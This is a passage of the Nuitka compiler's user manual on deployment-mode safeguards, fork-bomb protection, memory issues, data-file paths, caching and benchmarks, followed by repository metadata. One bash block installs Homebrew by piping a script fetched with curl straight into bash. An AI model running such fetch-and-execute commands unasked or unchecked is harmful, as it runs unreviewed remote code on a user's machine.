)\n\n      if os.path.exists(splash_filename):\n         os.unlink(splash_filename)\n\n   print(\"Done... splash should be gone.\")\n   ...\n\n   # Rest of your program goes here.\n\nReports\n=======\n\nFor analysis of your program and Nuitka packaging, there is the\n`Compilation Report`_ available. You can also make custom reports by\nproviding your template, with a few of them built-in to Nuitka. These\nreports carry all the detail information, e.g. when a module was\nattempted to be imported, but not found, you can see where that happens.\nFor bug reporting, it is very much recommended to provide the report.\n\nVersion Information\n===================\n\nYou can attach copyright and trademark information, company name,\nproduct name, and so on to your compilation. This is then used in\nversion information for the created binary on Windows, or application\nbundle on macOS. If you find something that is lacking, please let us\nknow.\n\n******************\n Typical Problems\n******************\n\nDeployment Mode\n===============\n\nBy default, Nuitka compiles without ``--deployment`` which leaves a set\nof safe guards and helpers on, that are aimed at debugging wrong uses of\nNuitka.\n\nThis is a new feature, and implements a bunch of protections and\nhelpers, that are documented here.\n\nFork bombs (self-execution)\n---------------------------\n\nSo after compilation, ``sys.executable`` is the compiled binary. In case\nof packages like ``multiprocessing``, ``joblib``, or ``loky`` what these\ntypically do is to expect to run from a full ``python`` with\n``sys.executable`` and then to be able to use its options like ``-c\ncommand`` or ``-m module_name`` and then be able to launch other code\ntemporarily or permanently as a service daemon.\n\nWith Nuitka however, this executes your program again, and puts these\narguments, in ``sys.argv`` where you maybe ignore them, and then you\nfork yourself again to launch the helper daemons. Sometimes this ends up\nspawning CPU count processes that spawn CPU count processes that... this\nis called a fork bomb, and with almost all systems, that freezes them\neasily to death.\n\nThat is why e.g. this happens with default Nuitka:\n\n.. code::\n\n   ./hello.dist/hello.bin -l fooL -m fooM -n fooN -o fooO -p\n   Error, the program tried to call itself with '-m' argument. Disable with '--no-deployment-flag=self-execution'.\n\nYour program may well have its own command line parsing, and not use an\nunsupported package that does attempt to re-execute. In this case, you\nneed at *compile time* to use ``--no-deployment-flag=self-execution``\nwhich disables this specific guard.\n\nMisleading Messages\n-------------------\n\nSome packages output what they think is helpful information about what\nthe reason of a failed import might mean. With compiled programs there\nare very often just plain wrong. We try and repair those in\nnon-deployment mode. Here is an example, where we change a message that\nasks to pip install (which is not the issue) to point the user to the\ninclude command that makes an ``imageio`` plugin work.\n\n.. code:: yaml\n\n   - module-name: 'imageio.core.imopen'\n     anti-bloat:\n       - replacements_plain:\n           '`pip install imageio[{config.install_name}]` to install it': '`--include-module={config.module_name}` with Nuitka to include it'\n           'err_type = ImportError': 'err_type = RuntimeError'\n         when: 'not deployment'\n\nAnd much more\n-------------\n\nThe deployment mode is relatively new and has constantly more features\nadded, e.g. something for ``FileNotFoundError`` should be coming soon.\n\nDisabling All\n-------------\n\nAll these helpers can of course be disabled at once with\n``--deployment`` but keep in mind that for debugging, you may want to\nre-enable it. You might want to use Nuitka Project options and an\nenvironment variable to make this conditional.\n\nShould you disable them all?\n\nWe believe, disabling should only happen selectively, but with PyPI\nupgrades, your code changes, all of these issues can sneak back in. The\nspace saving of deployment mode is currently negligible, so attempt to\nnot do it, but review what exists, and if you know that it cannot affect\nyou, or if it does, you will not need it. Some of the future ones, will\nclearly be geared at beginner level usage.\n\nWindows Virus scanners\n======================\n\nBinaries compiled on Windows with default settings of Nuitka and no\nfurther actions taken might be recognized by some AV vendors as malware.\nThis is avoidable, but only in Nuitka commercial there is actual support\nand instructions for how to do it, seeing this as a typical commercial\nonly need. https://nuitka.net/doc/commercial.html\n\nLinux Standalone\n================\n\nFor Linux standalone it is pretty difficult to build a binary that works\non other Linux versions. This is mainly because on Linux, much software\nis built specifically targeted to concrete DLLs. Things like glibc used,\nare then encoded into the binary built, and it will not run with an\nolder glibc, just to give one critical example.\n\nThe solution is to build on the oldest OS that you want to see\nsupported. Picking that and setting it up can be tedious, so can be\nlogin, and keeping it secure, as it's something you put your source code\non.\n\nTo aid that, Nuitka commercial has container based builds, that you can\nuse. This uses dedicated optimized Python builds, targets CentOS 7 and\nsupports even newest Pythons and very old OSes that way using recent C\ncompiler chains all turn key solution. The effort needs to be\ncompensated to support Nuitka development for Linux, there you need to\npurchase it https://nuitka.net/doc/commercial.html but even a sponsor\nlicense will be cheaper than doing it yourself.\n\nProgram crashes system (fork bombs)\n===================================\n\nA fork bomb is a program that starts itself over and over. This can\neasily happen, since ``sys.executable`` for compiled programs is not a\nPython interpreter, and packages that try to do multiprocessing in a\nbetter way, often relaunch themselves through this, and Nuitka needs and\ndoes have handling for these with known packages. However, you may\nencounter a situation where the detection of this fails. See deployment\noption above that is needed to disable this protection.\n\nWhen this fork bomb happens easily all memory, all CPU of the system\nthat is available to the user is being used, and even the most powerful\nbuild system will go down in flames sometimes needing a hard reboot.\n\nFor fork bombs, we can use ``--experimental=debug-self-forking`` and see\nwhat it does, and we have a trick, that prevents fork bombs from having\nany actual success in their bombing. Put this at the start of your\nprogram.\n\n.. code:: python\n\n   import os, sys\n\n   if \"NUITKA_LAUNCH_TOKEN\" not in os.environ:\n      sys.exit(\"Error, need launch token or else fork bomb suspected.\")\n   else:\n      del os.environ[\"NUITKA_LAUNCH_TOKEN\"]\n\nActually Nuitka is trying to get ahold of them without the deployment\noption already, finding \"-c\" and \"-m\" options, but it may not be perfect\nor not work well with a package (anymore).\n\nMemory issues and compiler bugs\n===============================\n\nIn some cases, the C compilers will crash saying they cannot allocate\nmemory or that some input was truncated, or similar error messages,\nclearly from it. These are example error messages, that are a sure sign\nof too low memory, there is no end to them.\n\n.. code::\n\n   # gcc\n   fatal error: error writing to -: Invalid argument\n   Killed signal terminated program\n   # MSVC\n   fatal error C1002: compiler is out of heap space in pass 2\n   fatal error C1001: Internal compiler error\n\nThere are several options you can explore here.\n\nAsk Nuitka to use less memory\n-----------------------------\n\nThere is a dedicated option ``--low-memory`` which influences decisions\nof Nuitka, such that it avoids high usage of memory during compilation\nat the cost of increased compile time.\n\nAvoid 32 bit C compiler/assembler memory limits\n-----------------------------------------------\n\nDo not use a 32 bit compiler, but a 64 bit one. If you are using Python\nwith 32 bits on Windows, you most definitely ought to use MSVC as the C\ncompiler, and not MinGW64. The MSVC is a cross-compiler, and can use\nmore memory than gcc on that platform. If you are not on Windows, that\nis not an option, of course. Also, using the 64 bit Python will work.\n\nUse a minimal virtualenv\n------------------------\n\nWhen you compile from a living installation, that may well have many\noptional dependencies of your software installed. Some software will\nthen have imports on these, and Nuitka will compile them as well. Not\nonly may these be just the troublemakers, they also require more memory,\nso get rid of that. Of course, you do have to check that your program\nhas all the needed dependencies before you attempt to compile, or else\nthe compiled program will equally not run.\n\nUse LTO compilation or not\n--------------------------\n\nWith ``--lto=yes`` or ``--lto=no`` you can switch the C compilation to\nonly produce bytecode, and not assembler code and machine code directly,\nbut make a whole program optimization at the end. This will change the\nmemory usage pretty dramatically, and if your error is coming from the\nassembler, using LTO will most definitely avoid that.\n\nSwitch the C compiler to clang\n------------------------------\n\nPeople have reported that programs that fail to compile with gcc due to\nits bugs or memory usage work fine with clang on Linux. On Windows, this\ncould still be an option, but it needs to be implemented first for the\nautomatic downloaded gcc, that would contain it. Since MSVC is known to\nbe more memory effective anyway, you should go there, and if you want to\nuse Clang, there is support for the one contained in MSVC.\n\nAdd a larger swap file to your embedded Linux\n---------------------------------------------\n\nOn systems with not enough RAM, you need to use swap space. Running out\nof it is possibly a cause, and adding more swap space, or one at all,\nmight solve the issue, but beware that it will make things extremely\nslow when the compilers swap back and forth, so consider the next tip\nfirst or on top of it.\n\nLimit the amount of compilation jobs\n------------------------------------\n\nWith the ``--jobs`` option of Nuitka, it will not start many C compiler\ninstances at once, each competing for the scarce resource of RAM. By\npicking a value of one, only one C compiler instance will be running,\nand on an 8 core system, that reduces the amount of memory by factor 8,\nso that's a natural choice right there.\n\nDynamic ``sys.path``\n====================\n\nIf your script modifies ``sys.path``, e.g. inserts directories with\nsource code relative to it, Nuitka will not be able to see those.\nHowever, if you set the ``PYTHONPATH`` to the resulting value, it will\nbe able to compile it and find the used modules from these paths as\nwell.\n\nManual Python File Loading\n==========================\n\nA very frequent pattern with private code is that it scans plugin\ndirectories of some kind, and e.g. uses ``os.listdir``, then considers\nPython filenames, and then opens a file and does ``exec`` on them. This\napproach works for Python code, but for compiled code, you should use\nthis much cleaner approach, that works for pure Python code and is a lot\nless vulnerable.\n\n.. code:: python\n\n   # Using a package name, to locate the plugins. This is also a sane\n   # way to organize them into a directory.\n   scan_path = scan_package.__path__\n\n   for item in pkgutil.iter_modules(scan_path):\n      importlib.import_module(scan_package.__name__ + \".\" + item.name)\n\n      # You may want to do it recursively, but we don't do this here in\n      # this example. If you'd like to, handle that in this kind of branch.\n      if item.ispkg:\n         ...\n\nMissing data files in standalone\n================================\n\nIf your program fails to find data file, it can cause all kinds of\ndifferent behavior, e.g. a package might complain it is not the right\nversion because a ``VERSION`` file check defaulted to an unknown. The\nabsence of icon files or help texts, may raise strange errors.\n\nOften the error paths for files not being present are even buggy and\nwill reveal programming errors like unbound local variables. Please look\ncarefully at these exceptions, keeping in mind that this can be the\ncause. If your program works without standalone, chances are data files\nmight be the cause.\n\nThe most common error indicating file absence is of course an uncaught\n``FileNotFoundError`` with a filename. You should figure out what\npackage is missing files and then use ``--include-package-data``\n(preferably), or ``--include-data-dir``/``--include-data-files`` to\ninclude them.\n\nMissing DLLs/EXEs in standalone\n===============================\n\nNuitka has plugins that deal with copying DLLs. For NumPy, SciPy,\nTkinter, etc.\n\nThese need special treatment to be able to run on other systems.\nManually copying them is not enough and will give strange errors.\nSometimes newer version of packages, esp. NumPy can be unsupported. In\nthis case, you will have to raise an issue, and use the older one.\n\nIf you want to manually add a DLL or an EXE because it is your project\nonly, you will have to use user Yaml files describing where they can be\nfound. This is described in detail with examples in the `Nuitka Package\nConfiguration <https://nuitka.net/doc/nuitka-package-config.html>`__\npage.\n\nDependency creep in standalone\n==============================\n\nSome packages are a single import, but to Nuitka mean that more than a\nthousand packages (literally) are to be included. The prime example of\nPandas, which does want to plug and use just about everything you can\nimagine. Multiple frameworks for syntax highlighting everything\nimaginable take time.\n\nNuitka will have to learn effective caching to deal with this in the\nfuture. Presently, you will have to deal with huge compilation times for\nthese.\n\nA major weapon in fighting dependency creep should be applied, namely\nthe ``anti-bloat`` plugin, which offers interesting abilities, that can\nbe put to use and block unneeded imports, giving an error for where they\noccur. Use it e.g. like this ``--noinclude-pytest-mode=nofollow\n--noinclude-setuptools-mode=nofollow`` and e.g. also\n``--noinclude-custom-mode=setuptools:error`` to get the compiler to\nerror out for a specific package. Make sure to check its help output. It\ncan take for each module of your choice, e.g. forcing also that e.g.\n``PyQt5`` is considered uninstalled for standalone mode.\n\nIt's also driven by a configuration file, ``anti-bloat.yml`` that you\ncan contribute to, removing typical bloat from packages. Please don't\nhesitate to enhance it and make PRs towards Nuitka with it.\n\nStandalone: Finding files\n=========================\n\nThe standard code that normally works, also works, you should refer to\n``os.path.dirname(__file__)`` or use all the packages like ``pkgutil``,\n``pkg_resources``, ``importlib.resources`` to locate data files near the\nstandalone binary.\n\n.. important::\n\n   What you should **not** do, is use the current directory\n   ``os.getcwd``, or assume that this is the script directory, e.g. with\n   paths like ``data/``.\n\n   If you did that, it was never good code. Links, to a program,\n   launching from another directory, etc. will all fail in bad ways. Do\n   not make assumptions about the directory your program is started\n   from.\n\nIn case you mean to refer to the location of the ``.dist`` folder for\nfiles that are to reside near the binary, there is\n``__compiled__.containing_dir`` that also abstracts all differences with\n``--macos-create-app-bundle`` and the ``.app`` folder a having more\nnested structure.\n\n.. code:: python\n\n   # This will find a file *near* your app or dist folder\n   try:\n      open(os.path.join(__compiled__.containing_dir, \"user-provided-file.txt\"))\n   except NameError:\n      open(os.path.join(os.path.dirname(sys.argv[0]), \"user-provided-file.txt\"))\n\nOnefile: Finding files\n======================\n\nThere is a difference between ``sys.argv[0]`` and ``__file__`` of the\nmain module for the onefile mode, that is caused by using a bootstrap to\na temporary location. The first one will be the original executable\npath, whereas the second one will be the temporary or permanent path the\nbootstrap executable unpacks to. Data files will be in the later\nlocation, your original environment files will be in the former\nlocation.\n\nGiven 2 files, one which you expect to be near your executable, and one\nwhich you expect to be inside the onefile binary, access them like this.\n\n.. code:: python\n\n   # This will find a file *near* your onefile.exe\n   open(os.path.join(os.path.dirname(sys.argv[0]), \"user-provided-file.txt\"))\n   # This will find a file *inside* your onefile.exe\n   open(os.path.join(os.path.dirname(__file__), \"user-provided-file.txt\"))\n\n   # This will find a file *near* your onefile binary and work for standalone too\n   try:\n      open(os.path.join(__compiled__.containing_dir, \"user-provided-file.txt\"))\n   except NameError:\n      open(os.path.join(os.path.dirname(sys.argv[0]), \"user-provided-file.txt\"))\n\n.. note::\n\n   When the program is launched from the executable, the original\n   ``sys.argv[0]`` from the invocation command line will not be\n   preserved, it will be made an absolute path.\n\n   For advanced use cases where one needs access to the original\n   ``sys.argv[0]``, it may be found at ``__compiled__.original_argv0``.\n   The field will read back as ``None`` if the program is not launched\n   from the onefile executable, thus not having gone through the onefile\n   bootstrap stage; the original ``sys.argv[0]`` would be preserved as\n   well in this case.\n\n.. code:: python\n\n   # Suppose the onefile binary is placed at /opt/abc/bin/foo, and it was\n   # symlinked to /usr/local/bin/bar, and invoked as `bar ...`:\n   assert sys.argv[0] == \"/usr/local/bin/bar\"\n   assert __compiled__.original_argv0 == \"bar\"\n\n   # If the onefile tempdir is overridden and the program is invoked\n   # directly from the unpacked location, sys.argv[0] would not be touched.\n   #\n   # Suppose the onefile tempdir is /home/xx/.cache/abc/0.1.2, and the\n   # foo.bin executable inside is symlinked to /usr/local/bin/baz, and\n   # invoked as `baz ...`:\n   assert sys.argv[0] == \"baz\"\n   assert __compiled__.original_argv0 is None\n\nWindows Programs without console give no errors\n===============================================\n\nFor debugging purposes, use the options ``--force-stdout-spec`` and\n``--force-stderr-spec`` with paths as documented for\n``--onefile-tempdir-spec`` above. These can be relative to the program\nor absolute, so you can see the outputs given. Also you can run the\nprogram on a terminal prompt like ``CMD.exe`` to see its outputs.\n\nDeep copying uncompiled functions\n=================================\n\nSometimes people use this kind of code, which for packages on PyPI, we\ndeal with by doing source code patches on the fly. If this is in your\nown code, here is what you can do:\n\n.. code:: python\n\n   def binder(func, name):\n      result = types.FunctionType(func.__code__, func.__globals__, name=func.__name__, argdefs=func.__defaults__, closure=func.__closure__)\n      result = functools.update_wrapper(result, func)\n      result.__kwdefaults__ = func.__kwdefaults__\n      result.__name__ = name\n      return result\n\nCompiled functions cannot be used to create uncompiled ones from, so the\nabove code will not work. However, there is a dedicated ``clone``\nmethod, that is specific to them, so use this instead.\n\n.. code:: python\n\n   def binder(func, name):\n      try:\n         result = func.clone()\n      except AttributeError:\n         result = types.FunctionType(func.__code__, func.__globals__, name=func.__name__, argdefs=func.__defaults__, closure=func.__closure__)\n         result = functools.update_wrapper(result, func)\n         result.__kwdefaults__ = func.__kwdefaults__\n\n      result.__name__ = name\n      return result\n\nModules: Extension modules are not executable directly\n======================================================\n\nA package can be compiled with Nuitka, no problem, but when it comes to\nexecuting it, ``python -m compiled_module`` is not going to work and\ngive the error ``No code object available for AssertsTest`` because the\ncompiled module is not source code, and Python will not just load it.\nThe closest would be ``python -c \"import compile_module\"`` and you might\nhave to call the main function yourself.\n\nTo support this, the CPython ``runpy`` and/or ``ExtensionFileLoader``\nwould need improving such that Nuitka could supply its compiled module\nobject for Python to use.\n\n******\n Tips\n******\n\nNuitka Options in the code\n==========================\n\nOne clean way of providing options to Nuitka, that you will always use\nfor your program, is to put them into the main file you compile. There\nis even support for conditional options, and options using pre-defined\nvariables, this is an example:\n\n.. code:: python\n\n   # Compilation mode, support OS-specific options\n   # nuitka-project-if: {OS} in (\"Windows\", \"Linux\", \"Darwin\", \"FreeBSD\"):\n   #    nuitka-project: --onefile\n   # nuitka-project-else:\n   #    nuitka-project: --standalone\n\n   # The PySide2 plugin covers qt-plugins\n   # nuitka-project: --enable-plugin=pyside2\n   # nuitka-project: --include-qt-plugins=qml\n\nThe comments must be at the start of lines, and indentation inside of\nthem is to be used, to end a conditional block, much like in Python.\nThere are currently no other keywords than the used ones demonstrated\nabove.\n\nYou can put arbitrary Python expressions there, and if you wanted to\ne.g. access a version information of a package, you could simply use\n``__import__(\"module_name\").__version__`` if that would be required to\ne.g. enable or disable certain Nuitka settings. The only thing Nuitka\ndoes that makes this not Python expressions, is expanding ``{variable}``\nfor a pre-defined set of variables:\n\nTable with supported variables:\n\n+------------------+--------------------------------+------------------------------------------+\n| Variable         | What this Expands to           | Example                                  |\n+==================+================================+==========================================+\n| {OS}             | Name of the OS used            | Linux, Windows, Darwin, FreeBSD, OpenBSD |\n+------------------+--------------------------------+------------------------------------------+\n| {Version}        | Version of Nuitka              | e.g. (1, 6, 0)                           |\n+------------------+--------------------------------+------------------------------------------+\n| {Commercial}     | Version of Nuitka Commercial   | e.g. (2, 1, 0)                           |\n+------------------+--------------------------------+------------------------------------------+\n| {Arch}           | Architecture used              | x86_64, arm64, etc.                      |\n+------------------+--------------------------------+------------------------------------------+\n| {MAIN_DIRECTORY} | Directory of the compiled file | some_dir/maybe_relative                  |\n+------------------+--------------------------------+------------------------------------------+\n| {Flavor}         | Variant of Python              | e.g. Debian Python, Anaconda Python      |\n+------------------+--------------------------------+------------------------------------------+\n\nThe use of ``{MAIN_DIRECTORY}`` is recommended when you want to specify\na filename relative to the main script, e.g. for use in data file\noptions or user package configuration yaml files,\n\n.. code:: python\n\n   # nuitka-project: --include-data-files={MAIN_DIRECTORY}/my_icon.png=my_icon.png\n   # nuitka-project: --user-package-configuration-file={MAIN_DIRECTORY}/user.nuitka-package.config.yml\n\nPython command line flags\n=========================\n\nFor passing things like ``-O`` or ``-S`` to Python, to your compiled\nprogram, there is a command line option name ``--python-flag=`` which\nmakes Nuitka emulate these options.\n\nThe most important ones are supported, more can certainly be added.\n\nCaching compilation results\n===========================\n\nThe C compiler, when invoked with the same input files, will take a long\ntime and much CPU to compile over and over. Make sure you are having\n``ccache`` installed and configured when using gcc (even on Windows). It\nwill make repeated compilations much faster, even if things are not yet\nnot perfect, i.e. changes to the program can cause many C files to\nchange, requiring a new compilation instead of using the cached result.\n\nOn Windows, with gcc Nuitka supports using ``ccache.exe`` which it will\noffer to download from an official source and it automatically. This is\nthe recommended way of using it on Windows, as other versions can e.g.\nhang.\n\nNuitka will pick up ``ccache`` if it's found in system ``PATH``, and it\nwill also be possible to provide if by setting ``NUITKA_CCACHE_BINARY``\nto the full path of the binary, this is for use in CI systems where\nthings might be non-standard.\n\nFor the MSVC compilers and ClangCL setups, using the ``clcache`` is\nautomatic and included in Nuitka.\n\nOn macOS and Intel, there is an automatic download of a ``ccache``\nbinary from our site, for arm64 arches, it's recommended to use this\nsetup, which installs Homebrew and ccache in there. Nuitka picks that\none up automatically if it on that kind of machine. You need and should\nnot use Homebrew with Nuitka otherwise, it's not the best for standalone\ndeployments, but we can take ``ccache`` from there.\n\n.. code:: bash\n\n   export HOMEBREW_INSTALL_FROM_API=1\n   /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n   eval $(/opt/homebrew/bin/brew shellenv)\n   brew install ccache\n\nControl where Caches live\n=========================\n\nThe storage for cache results of all kinds, downloads, cached\ncompilation results from C and Nuitka, is done in a platform dependent\ndirectory as determined by the ``appdirs`` package. However, you can\noverride it with setting the environment variable ``NUITKA_CACHE_DIR``\nto a base directory. This is for use in environments where the home\ndirectory is not persisted, but other paths are.\n\nThere is also per cache control of these caches, here is a table of\nenvironment variables that you can set before starting the compilation,\nto make Nuitka store some of these caches in an entirely separate space.\n\n+------------------+-----------------------------------+----------------------------------------+\n| Cache name       | Environment Variable              | Data Put there                         |\n+==================+===================================+========================================+\n| downloads        | NUITKA_CACHE_DIR_DOWNLOADS        | Downloads made, e.g. dependency walker |\n+------------------+-----------------------------------+----------------------------------------+\n| ccache           | NUITKA_CACHE_DIR_CCACHE           | Object files created by gcc            |\n+------------------+-----------------------------------+----------------------------------------+\n| clcache          | NUITKA_CACHE_DIR_CLCACHE          | Object files created by MSVC           |\n+------------------+-----------------------------------+----------------------------------------+\n| bytecode         | NUITKA_CACHE_DIR_BYTECODE         | Bytecode of demoted modules            |\n+------------------+-----------------------------------+----------------------------------------+\n| dll-dependencies | NUITKA_CACHE_DIR_DLL_DEPENDENCIES | DLL dependencies                       |\n+------------------+-----------------------------------+----------------------------------------+\n\nRunners\n=======\n\nAvoid running the ``nuitka`` binary, doing ``python -m nuitka`` will\nmake a 100% sure you are using what you think you are. Using the wrong\nPython will make it give you ``SyntaxError`` for good code or\n``ImportError`` for installed modules. That is happening, when you run\nNuitka with Python2 on Python3 code and vice versa. By explicitly\ncalling the same Python interpreter binary, you avoid that issue\nentirely.\n\nFastest C Compilers\n===================\n\nThe fastest binaries of ``pystone.exe`` on Windows with 64 bits Python\nproved to be significantly faster with MinGW64, roughly 20% better\nscore. So it is recommended for use over MSVC. Using ``clang-cl.exe`` of\nClang7 was faster than MSVC, but still significantly slower than\nMinGW64, and it will be harder to use, so it is not recommended.\n\nOn Linux, for ``pystone.bin``, the binary produced by ``clang6`` was\nfaster than ``gcc-6.3``, but not by a significant margin. Since gcc is\nmore often already installed, that is recommended to use for now.\n\nDifferences in C compilation times have not yet been examined.\n\nUnexpected Slowdowns\n====================\n\nUsing the Python DLL, like standard CPython does, can lead to unexpected\nslowdowns, e.g. in uncompiled code that works with Unicode strings. This\nis because calling to the DLL rather than residing in the DLL causes\noverhead, and this even happens to the DLL with itself, being slower,\nthan a Python all contained in one binary.\n\nSo if feasible, aim at static linking, which is currently only possible\nwith Anaconda Python on non-Windows, Debian Python2, self compiled\nPythons (do not activate ``--enable-shared``, not needed), and installs\ncreated with ``pyenv``.\n\n.. note::\n\n   On Anaconda, you may need to execute ``conda install\n   libpython-static``\n\nStandalone executables and dependencies\n=======================================\n\nThe process of making standalone executables for Windows traditionally\ninvolves using an external dependency walker to copy necessary libraries\nalong with the compiled executables to the distribution folder.\n\nThere are plenty of ways to find that something is missing. Do not\nmanually copy things into the folder, esp. not DLLs, as that's not going\nto work. Instead, make bug reports to get these handled by Nuitka\nproperly.\n\nWindows errors with resources\n=============================\n\nOn Windows, the Windows Defender tool and the Windows Indexing Service\nboth scan the freshly created binaries, while Nuitka wants to work with\nit, e.g. adding more resources, and then preventing operations randomly\ndue to holding locks. Make sure to exclude your compilation stage from\nthese services.\n\nWindows standalone program redistribution\n=========================================\n\nWhether compiling with MingW or MSVC, the standalone programs have\nexternal dependencies to Visual C Runtime libraries. Nuitka tries to\nship those dependent DLLs by copying them from your system.\n\nBeginning with Microsoft Windows 10, Microsoft ships ``ucrt.dll``\n(Universal C Runtime libraries) which handles calls to\n``api-ms-crt-*.dll``.\n\nWith earlier Windows platforms (and wine/ReactOS), you should consider\ninstalling Visual C runtime libraries before executing a Nuitka\nstandalone compiled program.\n\nDepending on the used C compiler, you'll need the following redist\nversions on the target machines. However, notice that compilation using\nthe 14.3 based version is always recommended, working and best\nsupported, unless you want to target Windows 7.\n\n+------------------+-------------+----------+\n| Visual C version | Redist Year | CPython  |\n+==================+=============+==========+\n| 14.3             | 2022        | 3.11     |\n+------------------+-------------+----------+\n| 14.2             | 2019        | 3.5-3.10 |\n+------------------+-------------+----------+\n| 14.1             | 2017        | 3.5-3.8  |\n+------------------+-------------+----------+\n| 14.0             | 2015        | 3.5-3.8  |\n+------------------+-------------+----------+\n| 10.0             | 2010        | 3.4      |\n+------------------+-------------+----------+\n| 9.0              | 2008        | 2.6, 2.7 |\n+------------------+-------------+----------+\n\nWhen using MingGW64 as downloaded by Nuitka, you'll need the following\nredist versions:\n\n+----------------------------+-------------+---------------------+\n| MingGW64 version           | Redist Year | CPython             |\n+============================+=============+=====================+\n| WinLibs automatic download | 2015        | 2.6, 2.7, 3.4- 3.11 |\n+----------------------------+-------------+---------------------+\n\nOnce the corresponding runtime libraries are installed on the target\nsystem, you may remove all ``api-ms-crt-*.dll`` files from your Nuitka\ncompiled dist folder.\n\nDetecting Nuitka at run time\n============================\n\nNuitka does *not* ``sys.frozen`` unlike other tools because it usually\ntriggers inferior code for no reason. For Nuitka, we have the module\nattribute ``__compiled__`` to test if a specific module was compiled,\nand the function attribute ``__compiled__`` to test if a specific\nfunction was compiled.\n\nProviding extra Options to Nuitka C compilation\n===============================================\n\nNuitka will apply values from the environment variables ``CCFLAGS``,\n``LDFLAGS`` during the compilation on top of what it determines to be\nnecessary. Beware, of course, that is this is only useful if you know\nwhat you are doing, so should this pose issues, raise them only with\nperfect information.\n\nProducing a 32 bit binary on a 64 bit Windows system\n====================================================\n\nNuitka will automatically target the architecture of the Python you are\nusing. If this is 64 bit, it will create a 64 bit binary, if it is 32\nbit, it will create a 32 bit binary. You have the option to select the\nbits when you download the Python. In the output of ``python -m nuitka\n--version`` there is a line for the architecture. It's ``Arch: x86_64``\nfor 64 bits, and just ``Arch: x86`` for 32 bits.\n\nThe C compiler will be picked to match that more or less automatically.\nIf you specify it explicitly, and it mismatches, you will get a warning\nabout the mismatch and informed that your compiler choice was rejected.\n\n********************\n Compilation Report\n********************\n\nWhen you use ``--report=compilation-report.xml`` Nuitka will create an\nXML file with detailed information about the compilation and packaging\nprocess. This is growing in completeness with every release and exposes\nmodule usage attempts, timings of the compilation, plugin influences,\ndata file paths, DLLs, and reasons why things are included or not.\n\nAt this time, the report contains absolute paths in some places, with\nyour private information. The goal is to make this blended out by\ndefault because we also want to become able to compare compilation\nreports from different setups, e.g. with updated packages, and see the\nchanges to Nuitka. The report is, however, recommended for your bug\nreporting.\n\nAlso, another form is available, where the report is free form and\naccording to a Jinja2 template of yours, and one that is included in\nNuitka. The same information as used to produce the XML file is\naccessible. However, right now, this is not yet documented, but we plan\nto add a table with the data. For a reader of the source code that is\nfamiliar with Jinja2, however, it will be easy to do it now already.\n\nIf you have a template, you can use it like this\n``--report-template=your_template.rst.j2:your_report.rst`` and of\ncourse, the usage of restructured text, is only an example. You can use\nMarkdown, your own XML, or whatever you see fit. Nuitka will just expand\nthe template with the compilation report data.\n\nCurrently, the following reports are included in Nuitka. You just use\nthe name as a filename, and Nuitka will pick that one instead.\n\n+---------------+--------------+--------------------------------------------------------+\n| Report Name   | Status       | Purpose                                                |\n+===============+==============+========================================================+\n| LicenseReport | experimental | Distributions used in a compilation with license texts |\n+---------------+--------------+--------------------------------------------------------+\n\n.. note::\n\n   The community can and should contribute more report types and help\n   enhancing the existing ones for good looks.\n\n*************\n Performance\n*************\n\nThis chapter gives an overview, of what to currently expect in terms of\nperformance from Nuitka. It's a work in progress and is updated as we\ngo. The current focus for performance measurements is Python 2.7, but\n3.x is going to follow later.\n\npystone results\n===============\n\nThe results are the top value from this kind of output, running pystone\n1000 times and taking the minimal value. The idea is that the fastest\nrun is most meaningful, and eliminates usage spikes.\n\n.. code:: bash\n\n   echo \"Uncompiled Python2\"\n   for i in {1..100}; do BENCH=1 python2 tests/benchmarks/pystone.py ; done | sort -rn | head -n 1\n   python2 -m nuitka --lto=yes --pgo-c tests/benchmarks/pystone.py\n   echo \"Compiled Python2\"\n   for i in {1..100}; do BENCH=1 ./pystone.bin ; done | sort -n | head -rn 1\n\n   PYTHON3=python3.10\n\n   # Using a 100 gives semi-reliable values already, 1000 for best accuracy.\n   RUNS=1000\n\n   $PYTHON3 -m nuitka --lto=yes --pgo-c --static-libpython=yes tests/benchmarks/pystone3.py\n   echo \"Uncompiled $PYTHON3\"\n   for i in $(seq 1 $RUNS); do BENCH=1 $PYTHON3 tests/benchmarks/pystone3.py ; done | sort -rn | head -n 1\n   echo \"Compiled $PYTHON3\"\n   for i in $(seq 1 $RUNS); do BENCH=1 ./pystone3.bin ; done | sort -rn | head -n 1\n\n+-------------------+-------------------+----------------------+---------------------+\n| Python            | Uncompiled        | Compiled LTO         | Compiled PGO        |\n+===================+===================+======================+=====================+\n| Debian Python 2.7 | 137497.87 (1.000) | 460995.20 (3.353)    | 503681.91 (3.663)   |\n+-------------------+-------------------+----------------------+---------------------+\n| Nuitka Python 2.7 | 144074.78 (1.048) | 479271.51 (3.486)    | 511247.44 (3.718)   |\n+-------------------+-------------------+----------------------+---------------------+\n\nReport issues or bugs\n=====================\n\nShould you encounter any issues, bugs, or ideas, please visit the\n`Nuitka bug tracker <https://github.com/Nuitka/Nuitka/issues>`__ and\nreport them.\n\nBest practices for reporting bugs:\n\n-  Please always include the following information in your report, for\n   the underlying Python version. You can easily copy&paste this into\n   your report. It does contain more information than you think. Do not\n   write something manually. You may always add, of course,\n\n   .. code:: bash\n\n      python -m nuitka --version\n\n-  Try to make your example minimal. That is, try to remove code that\n   does not contribute to the issue as much as possible. Ideally, come\n   up with a small reproducing program that illustrates the issue, using\n   ``print`` with different results when the program runs compiled or\n   native.\n\n-  If the problem occurs spuriously (i.e. not each time), try to set the\n   environment variable ``PYTHONHASHSEED`` to ``0``, disabling hash\n   randomization. If that makes the problem go away, try increasing in\n   steps of 1 to a hash seed value that makes it happen every time,\n   include it in your report.\n\n-  Do not include the created code in your report. Given proper input,\n   it's redundant, and it's not likely that I will look at it without\n   the ability to change the Python or Nuitka source and re-run it.\n\n-  Do not send screenshots of text, that is bad and lazy. Instead,\n   capture text outputs from the console.\n\n***************************\n Unsupported functionality\n***************************\n\nThe ``co_code`` attribute of code objects\n=========================================\n\nThe code objects are empty for native compiled functions. There is no\nbytecode with Nuitka's compiled function objects, so there is no way to\nprovide it.\n\nPDB\n===\n\nThere is no tracing of compiled functions to attach a debugger to.\n",
        "num_commits": 13013,
        "project_age_days": 4207,
        "project_created_at": "2013-04-23",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 167,
        "num_pull": 430,
        "num_issues": 2868,
        "num_opening_issue": 171,
        "project_size(kB)": 58032,
        "num_stargazers": 11948,
